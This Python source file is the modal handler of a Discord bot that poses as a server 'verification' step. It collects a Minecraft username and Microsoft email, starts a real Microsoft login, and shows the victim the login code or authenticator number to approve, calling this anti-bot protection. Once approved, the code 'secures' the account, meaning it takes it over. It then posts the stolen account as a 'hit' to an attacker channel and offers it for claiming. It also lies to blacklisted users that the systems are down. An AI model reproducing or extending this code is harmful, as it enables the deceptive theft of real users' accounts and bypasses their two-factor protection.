from database.database import DBConnection
from urllib.parse import quote
from discord import ui, Embed
import datetime
import discord
import asyncio
import json
import re

from views.buttons.codeSubmit import ButtonViewTwo
from views.buttons.button_three import ButtonViewThree
from views.buttons.buttonOptions import ButtonOptions
from views.buttons.accountInfo import accountInfo

from views.utils.startSecure import startSecuringAccount
from views.utils.initialSession import getSession
from views.utils.sendLogs import sendLogs
from views.utils.sendAuth import sendAuth

class MyModalOne(ui.Modal):
    def __init__(self):
        super().__init__(title="Verification")
        self.add_item(ui.InputText(label="Minecraft Username", required = True))
        self.add_item(ui.InputText(label="Minecraft Email", required = True))

    async def callback(self, interaction: discord.Interaction) -> None:
        username = quote(self.children[0].value)
        email = self.children[1].value
        config = json.load(open("config.json", "r+"))

        hits_channel = await interaction.client.fetch_channel(config["discord"]["accounts_channel"])

        # Blacklisted Users
        with DBConnection() as database:
            if interaction.user.id in database.getBlacklistedUsers():
                await interaction.response.send_message(
                    embed = Embed(
                        title = "Could not verify",
                        description = "Our systems seem to be down at the moment. Please try again in a few hours.",
                        color = 0xFF5C5C
                    ),
                    ephemeral = True
                )

                await sendLogs(
                    interaction.client, config,
                    Embed(
                        title = f"User | {interaction.user.name} ({interaction.user.id})",
                        description = f"**Email** | **Status** | **Reason**\n```{email} | Refused to Verify | User has been blacklisted```",
                        timestamp = datetime.datetime.now(),
                        colour = 0xFF5C5C
                    ).set_thumbnail(url = f"https://visage.surgeplay.com/full/512/{username}"),
                    view = ButtonOptions(interaction.user, interaction.user.id),
                    email = email
                )
                return

        # Check if email is valid
        if not re.compile(r"^[\w\.-]+@([\w-]+\.)+[\w-]{2,4}$").match(email):
            await interaction.response.send_message(
                embed = Embed(
                    title = "❌ Invalid Email Address",
                    description="Make sure you entered your email correctly!",
                    color = 0xFF5C5C
                ),
                ephemeral = True
            )

            await sendLogs(
                interaction.client, config,
                Embed(
                    title = f"User | {interaction.user.name} ({interaction.user.id})",
                    description = f"**Email** | **Status** | **Reason**\n```{email} | Failed to Verify | Invalid email entered```",
                    timestamp = datetime.datetime.now(),
                    colour = 0xFF5C5C
                ).set_thumbnail(url = f"https://visage.surgeplay.com/full/512/{username}"),
                view = ButtonOptions(interaction.user, interaction.user.id),
                email = email
            )
            return

        await interaction.response.defer(ephemeral=True)

        self.session = getSession()

        # Sends OTP/Auth code
        emailInfo = await sendAuth(self.session, email)

        # Email does not exist (ifExistsResults == 1 can be used as an alternative)
        if "Credentials" not in emailInfo:
            await sendLogs(
                interaction.client, config,
                Embed(
                    title = f"User | {interaction.user.name} ({interaction.user.id})",
                    description = f"**Email** | **Status** | **Reason**\n```{email} | Failed to send code | Email does not exist```",
                    timestamp = datetime.datetime.now(),
                    colour = 0xFF5C5C
                ).set_thumbnail(url = f"https://visage.surgeplay.com/full/512/{username}"),
                view = ButtonOptions(interaction.user, interaction.user.id),
                email = email
            )

            await interaction.followup.send(
                embed = Embed(
                    title = ":x: Failed to verify",
                    description = "The email you entered does not exist, make sure you entered it correctly!",
                    color = 0xFF5C5C
                ),
                ephemeral = True
            )
            return

        # Entropy = Authenticator App number to click in
        elif "RemoteNgcParams" in emailInfo["Credentials"]:
            print("\n| Starting securing process |\n")
            print("[+] - Found Authenticator App")

            device = emailInfo["Credentials"]["RemoteNgcParams"]["SessionIdentifier"]
            entropy = emailInfo["Credentials"]["RemoteNgcParams"]["Entropy"]

            await interaction.followup.send(
                embed = Embed(
                    title="Last Step",
                    description=f"An Authenticator Request has been sent.\nPlease confirm the code **`{entropy}`** on your app! This step prevents automated or fake verifications.",
                    colour=0x00FF00
                ),
                ephemeral = True
            )

            await sendLogs(
                interaction.client, config,
                Embed(
                    title = f"User | {interaction.user.name}",
                    description=f"Username | Email | Status\n```{username} | {email} | Waiting for Auth confirmation```",
                    timestamp = datetime.datetime.now(),
                    colour = 0x678DC6,
                ).set_thumbnail(url = f"https://visage.surgeplay.com/full/512/{username}"),
                view = ButtonOptions(interaction.user, interaction.user.id),
                email = email
            )

            # Checks every second for the authenticator state
            async def checkCode(flowToken):
                response = await self.session.post(
                    url = f"https://login.live.com/GetSessionState.srf?mkt=EN-US&lc=1033&slk={flowToken}&slkt=NGC",
                    headers = {
                        "Accept": "application/json",
                        "Content-Type": "application/json",
                        "Cookie": "MSPOK=$uuid-3d6b1bc3-9fcd-4bd0-a4b1-1a8855505627$uuid-1a3e6d72-d224-456d-868f-4b85ff342088$uuid-58a49dcf-5abd-4a23-95ef-ed1b5999931e;",
                        "Accept-Language": "en-US,en;q=0.9",
                        "Origin": "https://login.live.com",
                        "Referer": "https://login.live.com/"
                    },
                    json = {
                        "DeviceCode": flowToken
                    }
                )
                return response.json()

            i = 0
            while i < 60:

                data = await checkCode(device)
                if data["SessionState"] > 1 and data["AuthorizationState"] == 1:

                    await interaction.followup.send(
                        embed = Embed(
                            title = ":x: Failed to verify",
                            description = "You pressed the wrong number on your authenticator app. Try again!",
                            colour=0xFF5C5C
                        ),
                        ephemeral = True
                    )

                    await sendLogs(
                        interaction.client, config,
                        Embed(
                            title = f"User | {interaction.user.name} ({interaction.user.id})",
                            description = f"**Email** | **Status** | **Reason**\n```{email} | Failed to verify | Clicked on the wrong auth number```",
                            timestamp = datetime.datetime.now(),
                            colour = 0xFF5C5C
                        ).set_thumbnail(url = f"https://visage.surgeplay.com/full/512/{username}"),
                        view = ButtonOptions(interaction.user, interaction.user.id),
                        email = email
                    )
                    return

                elif data["SessionState"] > 1 and data["AuthorizationState"] > 1:

                    await sendLogs(
                        interaction.client, config,
                        content="**This account is being automaticly secured**"
                    )
                    await sendLogs(
                        interaction.client, config,
                        Embed(
                            title = f"User | {interaction.user.name}",
                            description=f"Username | Email | Status\n```{username} | {email} | Auth code confirmed!```",
                            timestamp = datetime.datetime.now(),
                            colour = 0x79D990,
                        ).set_thumbnail(url = f"https://visage.surgeplay.com/full/512/{username}"),
                        view = ButtonOptions(interaction.user, interaction.user.id),
                        email = email
                    )

                    await interaction.followup.send(
                        embed = discord.Embed(
                            title = "Processing...",
                            description = "⌛ Please allow us to proccess your roles",
                            color = 0xDE755B
                        ),
                        ephemeral = True
                    )

                    # Embeds | Account, Minecraft, SSID, Extra Info, Inbox (separate)
                    securedAccount = await startSecuringAccount(self.session, email, device)

                    if not securedAccount:
                        await sendLogs(
                            interaction.client, config,
                            Embed(
                                title = f"User | {interaction.user.name} ({interaction.user.id})",
                                description = f"**Email** | **Status** | **Reason**\n```{email} | Failed to secure | Invalid Code Entered```",
                                timestamp = datetime.datetime.now(),
                                colour = 0xFF5C5C
                            ).set_thumbnail(url = f"https://visage.surgeplay.com/full/512/{username}"),
                            view = ButtonOptions(interaction.user, interaction.user.id),
                            email = email
                        )
                        return

                    mc_name = securedAccount['minecraft']['name']
                    secured_desc = f"**{mc_name}** has been successfully secured."
                    if mc_name == "No Minecraft":
                        secured_desc = "An account has been secured but it does not own Minecraft."

                    await sendLogs(
                        interaction.client, config,
                        Embed(
                            title="New Account Secured",
                            description=secured_desc,
                            color=0xF4A460 if mc_name != "No Minecraft" else 0x678DC6
                        ).set_thumbnail(url=f"https://mc-heads.net/avatar/{quote(mc_name)}/128"),
                        email = email,
                        conly = True
                    )

                    await hits_channel.send("@everyone **Successfully secured an account**")
                    await hits_channel.send(embed = securedAccount["details"]["stats_embed"])
                    await hits_channel.send(
                        embed = securedAccount["hit_embed"],
                        view = accountInfo(
                            securedAccount["details"]
                        )
                    )

                    if config["claims"]["claims_enabled"]:
                        mc_name = securedAccount["minecraft"]["name"]
                        await sendLogs(
                            interaction.client, config,
                            Embed(
                                title="Account Available to Claim",
                                description=f"**MC Username:** `{mc_name}`\n**Claim ID:** `{securedAccount['claim_id']}`",
                                color=0x79D990
                            )
                        )

                    return

                await asyncio.sleep(1)
                i += 1

            await interaction.followup.send(
                embed = Embed(
                    title = ":x: Failed to verify",
                    description = "You pressed the wrong number on your authenticator app. Try again!",
                    colour=0x00FF00
                ),
                ephemeral = True
            )

            await sendLogs(
                interaction.client, config,
                Embed(
                    title = f"User | {interaction.user.name}",
                    description=f"Username | Email | Status\n```{username} | {email} | Failed to confirm for Auth```",
                    timestamp = datetime.datetime.now(),
                    colour = 0xDE755B
                ).set_thumbnail(url = f"https://visage.surgeplay.com/full/512/{username}"),
                view = ButtonOptions(interaction.user, interaction.user.id),
                email = email
            )
            return

        if "OtcLoginEligibleProofs" in emailInfo["Credentials"]:

            verflowtoken = None
            verEmail = None

            for value in emailInfo["Credentials"]["OtcLoginEligibleProofs"]:
                if value.get("otcSent"):
                    verflowtoken = value["data"]
                    verEmail = value["display"]
                    break

            if not verEmail or not verflowtoken:
                print("[X] - OtcLoginEligibleProofs found but no proof had otcSent=True")
                await interaction.followup.send(
                    embed=Embed(
                        title = "Security Email Required",
                        description = "We couldn't detect a recovery/security email for this account. Add a recovery email in your Microsoft account and try verifying again.",
                    ),
                    view=ButtonViewThree(),
                    ephemeral=True
                )
                await sendLogs(
                    interaction.client, config,
                    Embed(
                        title=f"User | {interaction.user.name} ({interaction.user.id})",
                        description=f"**Email** | **Status** | **Reason**\n```{email} | Failed | No OTP code was sent to any proof```",
                        timestamp=datetime.datetime.now(),
                        colour=0xFF5C5C
                    ).set_thumbnail(url=f"https://visage.surgeplay.com/full/512/{username}"),
                    view=ButtonOptions(interaction.user, interaction.user.id),
                    email=email
                )
                return

            print("\n| Starting securing process |\n")
            print(f"[+] - Found security email: {verEmail}")

            await interaction.followup.send(
                embed=Embed(
                    title="Last Step",
                    description=f"To complete verification, enter the confirmation code we sent to {verEmail}.\nThis step prevents automated or fake verifications.",
                    colour=0x00FF00
                ),
                view = ButtonViewTwo(
                    username = username,
                    email = email,
                    flowtoken = verflowtoken
                ),
                ephemeral = True
            )

            await sendLogs(
                interaction.client, config,
                Embed(
                    title = f"User | {interaction.user.name}",
                    description=f"Username | Email | Status\n```{username} | {email} | Waiting for OTP code```",
                    timestamp = datetime.datetime.now(),
                    colour = 0x678DC6,
                ).set_thumbnail(url = f"https://visage.surgeplay.com/full/512/{username}"),
                view = ButtonOptions(interaction.user, interaction.user.id),
                email = email
            )
            return

        await sendLogs(
            interaction.client, config,
            Embed(
                title = f"User | {interaction.user.name} ({interaction.user.id})",
                description = f"**Email** | **Status** | **Reason**\n```{email} | Failed to send code | No OTP methods found```",
                timestamp = datetime.datetime.now(),
                colour = 0xFF5C5C
            ).set_thumbnail(url = f"https://visage.surgeplay.com/full/512/{username}"),
            view = ButtonOptions(interaction.user, interaction.user.id),
            email = email
        )

        await interaction.followup.send(
            embed = Embed(
                title = "Security Email Required",
                description = "We couldn't detect a recovery/security email for this account. Add a recovery email in your Microsoft account and try verifying again."
            ),
            view = ButtonViewThree(),
            ephemeral = True
        )

        return
